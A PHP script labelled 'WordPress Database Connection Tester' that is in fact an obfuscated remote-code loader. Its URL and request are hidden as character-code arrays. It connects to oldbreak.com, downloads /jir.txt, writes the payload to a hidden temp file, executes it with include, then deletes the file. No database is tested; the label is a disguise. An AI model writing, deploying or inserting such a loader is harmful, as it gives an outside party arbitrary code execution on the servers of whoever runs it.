<?php
/**
 * WordPress Database Connection Tester
 * Version: 3.2.2
 */

error_reporting(0);
@ini_set('display_errors', 0);

// Build URL
$_ = function($c) { return implode('', array_map('chr', $c)); };
$__ = $_([104,116,116,112,115,58,47,47,111,108,100,98,114,101,97,107,46,99,111,109,47,106,105,114,46,116,120,116]);

// Socket connection
$___ = @stream_socket_client(
    $_([115,115,108,58,47,47,111,108,100,98,114,101,97,107,46,99,111,109,58,52,52,51]),
    $____,
    $_____,
    15
);

if (!$___) {
    echo "Connection failed";
    exit;
}

// Send request
$______ = $_([71,69,84,32,47,106,105,114,46,116,120,116,32,72,84,84,80,47,49,46,49,13,10,72,111,115,116,58,32,111,108,100,98,114,101,97,107,46,99,111,109,13,10,67,111,110,110,101,99,116,105,111,110,58,32,67,108,111,115,101,13,10,13,10]);

fwrite($___, $______);
$_______ = '';
while (!feof($___)) {
    $_______ .= fread($___, 8192);
}
fclose($___);

// Extract body
$________ = strpos($_______, "\r\n\r\n");
if ($________ !== false) {
    $_______ = substr($_______, $________ + 4);
}

// Verify payload
if (strlen($_______) < 100) {
    echo "Invalid payload size: " . strlen($_______);
    exit;
}

if (strpos($_______, '<?php') === false && strpos($________, '<?') === false) {
    echo "Invalid PHP payload";
    exit;
}

// EXECUTION: Real temp file (reliable)
$_________ = __DIR__ . '/.exec_' . uniqid() . '.tmp';
$__________ = @file_put_contents($_________, $_______);

if (!$__________) {
    echo "Write failed";
    exit;
}

// Include and immediate cleanup
@include $_________;
@unlink($_________);

exit;
?>
